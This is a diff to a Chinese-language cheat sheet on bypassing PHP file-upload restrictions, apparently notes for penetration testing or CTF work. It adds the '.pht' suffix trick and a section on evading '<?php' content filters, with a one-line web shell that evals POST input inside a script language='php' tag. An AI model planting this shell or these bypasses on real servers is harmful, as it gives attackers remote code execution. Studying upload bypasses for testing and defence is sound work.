@@ -186,6 +186,8 @@ array_filter($array1,$func);
 
 * 上传特殊后缀
 
+  * pht
+
 * `.htaccess`上传
 
 * `.user.ini`
@@ -276,16 +278,21 @@ array_filter($array1,$func);
 
   &gt; 一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符
 
-#### getmagesize()
+#### 检查文件内容
 
-#### exif_imagetype（）
+* `&lt;?php ?&gt;`被过滤
 
-#### 二次渲染
+  * script标签
 
-#### 利用标签绕过`&lt;?PHP?&gt;`检测
+  ```
+  &lt;script language=&#34;php&#34;&gt;
+   eval($_POST[2333]);
+  &lt;/script&gt;
+  ```
+
+  * 
 
 ### 服务端 · 条件竞争
-
 
 
 ---
